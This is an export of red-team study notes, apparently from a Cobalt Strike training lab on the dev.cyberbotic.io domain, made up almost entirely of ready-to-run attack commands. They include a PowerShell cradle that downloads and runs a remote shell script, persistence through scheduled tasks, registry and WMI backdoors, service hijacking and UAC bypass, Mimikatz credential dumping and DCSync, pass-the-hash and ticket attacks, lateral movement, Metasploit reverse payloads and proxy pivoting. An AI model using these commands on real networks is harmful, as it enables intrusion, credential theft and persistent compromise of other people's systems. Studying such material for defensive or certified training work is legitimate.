PS C:\&gt; [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Linux 
$ echo -n "IEX(New-Object Net.WebClient).downloadString('</rich_text>
    <rich_text link="webs http://10.10.14.31/shell.ps1')" scale="h3" weight="heavy">http://10.10.14.31/shell.ps1')</rich_text>
    <rich_text scale="h3" weight="heavy">" | iconv -t UTF-16LE | base64 -w 0

# Final Command
powershell -nop -enc &lt;BASE64_ENCODED_PAYLOAD&gt;

# Common userland persistence methods include HKCU / HKLM Registry Autoruns, Scheduled Tasks, Startup Folder

# Persistance - Task Scheduler
beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA" -n "Updater" -m add -o hourly

# Persistance - Startup Folder
beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAo..vAGEAIgApACkA" -f "UserEnvSetup" -m add

# Persistance - Registry Autorun
beacon&gt; cd C:\ProgramData
beacon&gt; upload C:\Payloads\http_x64.exe
beacon&gt; mv http_x64.exe updater.exe
beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

# Persistance COM Hijacks

# Persistance - Privilleged System User

# Windows Service
beacon&gt; cd C:\Windows
beacon&gt; upload C:\Payloads\tcp-local_x64.svc.exe
beacon&gt; mv tcp-local_x64.svc.exe legit-svc.exe
beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

# Register WMI event to trigger our payload
beacon&gt; cd C:\Windows
beacon&gt; upload C:\Payloads\dns_x64.exe
beacon&gt; powershell-import C:\Tools\PowerLurk.ps1
beacon&gt; powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
</rich_text>
    <node name="schtasks" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697289616" ts_lastsave="1697293915">
      <rich_text weight="heavy">
</rich_text>
      <rich_text scale="h3" weight="heavy">schtasks /create /tn "windowstracing" /tr "C:\Windows\system32\sxtrace.exe" /sc onstart /ru System</rich_text>
      <rich_text>


windowstracing          &gt;&gt;    scheduletask name </rich_text>
    </node>
  </node>
  <node name="Privilege Escalation" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697289697" ts_lastsave="1697289803">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy"># Query and Manage all the installed services
beacon&gt; powershell Get-Service | fl
beacon&gt; run wmic service get name, pathname
beacon&gt; run sc query
beacon&gt; run sc qc VulnService2
beacon&gt; run sc stop VulnService1
beacon&gt; run sc start VulnService1

# Use SharpUp to find exploitable services
beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit 

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># CASE 1: Unquoted Service Path (Hijack the service binary search logic to execute our payload)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
beacon&gt; powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
beacon&gt; cd C:\Program Files\Vulnerable Services
beacon&gt; upload C:\Payloads\tcp-local_x64.svc.exe
beacon&gt; mv tcp-local_x64.svc.exe Service.exe
beacon&gt; run sc stop VulnService1
beacon&gt; run sc start VulnService1
beacon&gt; connect localhost 4444

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># CASE 2: Weak Service Permission (Possible to modify service configuration)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
beacon&gt; powershell-import C:\Tools\Get-ServiceAcl.ps1
beacon&gt; powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
beacon&gt; run sc qc VulnService2
beacon&gt; mkdir C:\Temp
beacon&gt; cd C:\Temp
beacon&gt; upload C:\Payloads\tcp-local_x64.svc.exe
beacon&gt; run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
beacon&gt; run sc qc VulnService2
beacon&gt; run sc stop VulnService2
beacon&gt; run sc start VulnService2
beacon&gt; connect localhost 4444

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># CASE 3: Weak Service Binary Permission (Overwite the service binary due to weak permission)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
beacon&gt; powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
PS C:\Payloads&gt; copy "tcp-local_x64.svc.exe" "Service 3.exe"
beacon&gt; run sc stop VulnService3
beacon&gt; cd "C:\Program Files\Vulnerable Services"
beacon&gt; upload C:\Payloads\Service 3.exe
beacon&gt; run sc start VulnService3
beacon&gt; connect localhost 4444

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># UAC Bypass</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; run whoami /groups
beacon&gt; elevate uac-schtasks tcp-local
beacon&gt; run netstat -anop tcp
beacon&gt; connect localhost 4444</rich_text>
  </node>
  <node name="Credential Theft (using MIMIKATZ)" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697289803" ts_lastsave="1697289892">
    <rich_text weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># "!" symbol is used to run command in elevated context of System User
# "@" symbol is used to impersonate beacon thread token</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Dump the local SAM database </rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz !lsadump::sam

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Dump the logon passwords (Plain Text + Hashes) from LSASS.exe for currently logged on users</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz !sekurlsa::logonpasswords

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Dump the encryption keys used by Kerberos of logged on users (hashes incorrectly labelled as des_cbc_md4)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz !sekurlsa::ekeys

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Dump Domain Cached Credentials (cannotbe be used for lateral movement unless cracked)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz !lsadump::cache

# List the kerberos tickets cached in current logon session or all logon session (privileged session)
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Dump the TGT Ticket from given Logon Session (LUID)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt

# DC Sync
beacon&gt; make_token DEV\nlamb F3rrari
beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Dump krbtgt hash from DC (locally)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; mimikatz !lsadump::lsa /inject /name:krbtgt</rich_text>
  </node>
  <node name="Domain Recon" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697289930" ts_lastsave="1697290358">
    <rich_text indent="11" family="monospace" scale="h1" weight="heavy">Domain Recon using Power View</rich_text>
    <rich_text weight="heavy">


</rich_text>
    <rich_text family="monospace" weight="heavy"># Use PowerView for domain enumeration</rich_text>
    <rich_text weight="heavy">
beacon&gt; powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Information</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-Domain -Domain &lt;&gt;

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain SID</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainSID

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Controller</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainController | select Forest, Name, OSVersion | fl

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Forest Information</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-ForestDomain -Forest &lt;&gt;
</rich_text>
    <rich_text family="monospace" weight="heavy">
# Get Domain Policy </rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainPolicyData | select -expand SystemAccess

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain users</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

</rich_text>
    <rich_text family="monospace" weight="heavy"># Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainUser | select cn,serviceprincipalname
beacon&gt; powerpick Get-DomainUser -PreauthNotRequired
beacon&gt; powerpick Get-DomainUser -TrustedToAuth

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Computer</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Idenitify Computer Accounts where unconstrained and constrained delefation is enabled</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname
beacon&gt; powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain OU</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainOU -Properties Name | sort -Property Name

</rich_text>
    <rich_text family="monospace" weight="heavy"># Identify computers in given OU</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

# Get Domain group (Use -Recurse Flag)
beacon&gt; powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Group Member</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
beacon&gt; powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain GPO</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Find the System where given GPO are applicable</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Idenitfy domain users/group who have local admin via Restricted group or GPO</rich_text>
    <rich_text weight="heavy"> 
beacon&gt; powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Enumerates the machines where a specific domain user/group has local admin rights</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Trusts</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainTrust

</rich_text>
    <rich_text family="monospace" weight="heavy"># Find Local Admin Access on other domain computers based on context of current user</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Find-LocalAdminAccess
beacon&gt; powerpick Invoke-CheckLocalAdminAccess -ComputerName &lt;server_fqdn&gt;

</rich_text>
    <rich_text family="monospace" weight="heavy">beacon&gt; powerpick Invoke-UserHunter</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Find-PSRemotingLocalAdminAccess -ComputerName &lt;server_fqdn&gt;
beacon&gt; powerpick Find-WMILocalAdminAccess -ComputerName &lt;server_fqdn&gt;


</rich_text>
    <rich_text family="monospace" scale="h1" weight="heavy"># Use PowerView for domain enumeration</rich_text>
    <rich_text weight="heavy">

beacon&gt; powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Information</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-Domain -Domain &lt;&gt;

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain SID</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainSID

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Controller</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainController | select Forest, Name, OSVersion | fl

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Forest Information</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-ForestDomain -Forest &lt;&gt;

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Policy </rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainPolicyData | select -expand SystemAccess

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain users</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

</rich_text>
    <rich_text family="monospace" weight="heavy"># Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainUser | select cn,serviceprincipalname
beacon&gt; powerpick Get-DomainUser -PreauthNotRequired
beacon&gt; powerpick Get-DomainUser -TrustedToAuth

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Computer</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Idenitify Computer Accounts where unconstrained and constrained delegation is enabled</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname
beacon&gt; powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain OU</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainOU -Properties Name | sort -Property Name

</rich_text>
    <rich_text family="monospace" weight="heavy"># Identify computers in given OU</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain group (Use -Recurse Flag)</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Group Member</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
beacon&gt; powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain GPO</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Find the System where given GPO are applicable</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Idenitfy domain users/group who have local admin via Restricted group or GPO</rich_text>
    <rich_text weight="heavy"> 
beacon&gt; powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

</rich_text>
    <rich_text family="monospace" weight="heavy"># Enumerates the machines where a specific domain user/group has local admin rights</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

</rich_text>
    <rich_text family="monospace" weight="heavy"># Get Domain Trusts</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Get-DomainTrust

</rich_text>
    <rich_text family="monospace" weight="heavy"># Find Local Admin Access on other domain computers based on context of current user</rich_text>
    <rich_text weight="heavy">
beacon&gt; powerpick Find-LocalAdminAccess
beacon&gt; powerpick Invoke-CheckLocalAdminAccess -ComputerName &lt;server_fqdn&gt;

beacon&gt; powerpick Invoke-UserHunter
beacon&gt; powerpick Find-PSRemotingLocalAdminAccess -ComputerName &lt;server_fqdn&gt;
beacon&gt; powerpick Find-WMILocalAdminAccess -ComputerName &lt;server_fqdn&gt;
</rich_text>
  </node>
  <node name="User Impersonation" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="1697290358" ts_lastsave="1697290859">
    <node name="Pass The Hash Attack" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697290389" ts_lastsave="1697290461">
      <rich_text>
</rich_text>
      <rich_text weight="heavy">beacon&gt; getuid
beacon&gt; ls \\web.dev.cyberbotic.io\c$

</rich_text>
      <rich_text family="monospace" weight="heavy"># PTH using inbuild method in CS (internally uses Mimikatz)</rich_text>
      <rich_text weight="heavy">
beacon&gt; pth DEV\jking 59fc0f884922b4ce376051134c71e22c

</rich_text>
      <rich_text family="monospace" weight="heavy"># Find Local Admin Access</rich_text>
      <rich_text weight="heavy">
beacon&gt; powerpick Find-LocalAdminAccess

beacon&gt; rev2self</rich_text>
      <node name="Pass The Tickett" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697290425" ts_lastsave="1697290506">
        <rich_text weight="heavy">
# Create a sacrificial token with dummy credentials
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123

</rich_text>
        <rich_text family="monospace" weight="heavy"># Inject the TGT ticket into logon session returned as output of previous command</rich_text>
        <rich_text weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

</rich_text>
        <rich_text family="monospace" weight="heavy"># OR Combine above 2 steps in one</rich_text>
        <rich_text weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj[...snip...]lDLklP 

beacon&gt; steal_token 4748</rich_text>
        <node name="OverPass The Hash" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697290506" ts_lastsave="1697292719">
          <rich_text weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

</rich_text>
          <rich_text family="monospace" weight="heavy"># Use aes256 hash for better opsec, along with /domain and /opsec flags (better opsec)</rich_text>
          <rich_text weight="heavy">
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap</rich_text>
        </node>
      </node>
    </node>
  </node>
  <node name="Token Impersonation &amp; Proces Injection" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697290859" ts_lastsave="1697291015">
    <rich_text weight="heavy">

beacon&gt; steal_token 4464


beacon&gt; inject 4464 x64 tcp-local



beacon&gt; shinject /path/to/binary</rich_text>
  </node>
  <node name="Lateral movement" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697291015" ts_lastsave="1697291392">
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">Moving laterally between computers in a domain is important for  accessing sensitive information/materials, and obtaining new  credentials.  Cobalt Strike provides three strategies for executing  Beacons/code/commands on remote targets.

The first and most convenient is to use the built-in </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">jump</rich_text>
    <rich_text scale="h3" weight="heavy"> command - the syntax is </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">jump [method] [target] [listener]</rich_text>
    <rich_text scale="h3" weight="heavy">.  Type </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">jump</rich_text>
    <rich_text scale="h3" weight="heavy">  to see a list of methods.  This will spawn a Beacon payload on the  remote target, and if using a P2P listener, will connect to it  automatically.
</rich_text>
    <rich_text>


</rich_text>
    <rich_text weight="heavy">
</rich_text>
    <rich_text scale="h3" weight="heavy">The </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">remote-exec</rich_text>
    <rich_text scale="h3" weight="heavy"> commands simply provide a means of  executing commands on a remote target.  They are therefore not exclusive  to lateral movement, but they can be used as such.  They require more  manual work to manage the payload, but do offer a wider degree of  control over what gets executed on the target.  You also need to connect  to P2P Beacons manually using </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">connect</rich_text>
    <rich_text scale="h3" weight="heavy"> or </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">link</rich_text>
    <rich_text scale="h3" weight="heavy">.
The third is to use Cobalt Strike's other primitives (</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">powershell</rich_text>
    <rich_text scale="h3" weight="heavy">, </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">execute-assembly</rich_text>
    <rich_text scale="h3" weight="heavy">,  etc) to implement something entirely custom.  This requires the most  amount of effort but also offers you the greatest degree of control.   Custom methods can be integrated into the </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">jump</rich_text>
    <rich_text scale="h3" weight="heavy"> and </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">remote-exec</rich_text>
    <rich_text scale="h3" weight="heavy"> commands using Aggressor.
Each of these strategies are compatible with the various techniques described in the User Impersonation chapter.  For example, you can use </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">pth</rich_text>
    <rich_text scale="h3" weight="heavy"> to impersonate a user and then </rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy">jump</rich_text>
    <rich_text scale="h3" weight="heavy"> to move laterally.
Some  of Seatbelt's commands can also be run remotely, which can be useful  enumerating its configurations and  defences before jumping to it.



</rich_text>
    <rich_text></rich_text>
    <encoded_png char_offset="516" justification="left" link=""></encoded_png>
    <encoded_png char_offset="1564" justification="left" link=""></encoded_png>
    <node name="1.1" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697291314" ts_lastsave="1697291353">
      <rich_text weight="heavy">
</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># using Jump</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Using remote exec</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; remote-exec psexec/winrm/wmi ComputerName &lt;uploaded binary on remote system&gt;

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Example Windows Management Instrumentation (WMI)</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; cd \\web.dev.cyberbotic.io\ADMIN$
beacon&gt; upload C:\Payloads\smb_x64.exe
beacon&gt; remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
beacon&gt; link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Executing .Net binary remotely </rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy"># Invoke DCOM (better opsec)</rich_text>
      <rich_text scale="h3" weight="heavy">
beacon&gt; powershell-import C:\Tools\Invoke-DCOM.ps1
beacon&gt; powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
beacon&gt; link web.dev.cyberbotic.io agent_vinod

</rich_text>
      <rich_text family="monospace" scale="h3" weight="heavy">NOTE: While using remote-exec for lateral movement, kindly generate the windows service binary as psexec creates a windows service pointing to uploaded binary for execution </rich_text>
    </node>
  </node>
  <node name="Session Passing" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697291392" ts_lastsave="1697291538">
    <rich_text weight="heavy">
</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># CASE 1: Beacon Passing (Within Cobalt Strike - Create alternate HTTP beacon while keeping DNS as lifeline)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; spawn x64 http

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># CASE 2: Foreign Listener (From CS to Metasploit - Staged Payload - only x86 payloads)</rich_text>
    <rich_text scale="h3" weight="heavy">

# Setup Metasploit listener
attacker@ubuntu ~&gt; sudo msfconsole -q
msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) &gt; set LHOST ens5
msf6 exploit(multi/handler) &gt; set LPORT 8080
msf6 exploit(multi/handler) &gt; run

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Setup a Foreign Listener in cobalt strike with above IP &amp; port details</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Use Jump psexec to execute the beacon payload and pass the session</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; jump psexec Foreign_listener

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)</rich_text>
    <rich_text scale="h3" weight="heavy">

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Setup up metasploit</rich_text>
    <rich_text scale="h3" weight="heavy">
msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_http
msf6 exploit(multi/handler) &gt; exploit

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Generate binary</rich_text>
    <rich_text scale="h3" weight="heavy">
ubuntu@DESKTOP-3BSK7NO ~&gt; msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Inject msf shellcode into process memory</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; shspawn x64 C:\Payloads\msf_http_x64.bin
</rich_text>
  </node>
  <node name="Pivoting" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1697291538" ts_lastsave="1697291703">
    <rich_text family="monospace" scale="h3" weight="heavy"># Enable Socks Proxy in beacon session (Use SOCKS 5 for better OPSEC)</rich_text>
    <rich_text scale="h3" weight="heavy">
beacon&gt; socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Verify the SOCKS proxy on team server</rich_text>
    <rich_text scale="h3" weight="heavy">
attacker@ubuntu ~&gt; sudo ss -lpnt

</rich_text>
    <rich_text family="monospace" scale="h3" weight="heavy"># Configure Proxychains in Linux</rich_text>
    <rich_text scale="h3" weight="heavy">
$ sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

$attacker@ubuntu ~&gt; proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
ubuntu@DESKTOP-3BSK7NO ~ &gt; proxychains wmiexec.py DEV/jking@10.10.122.30

</rich_text>
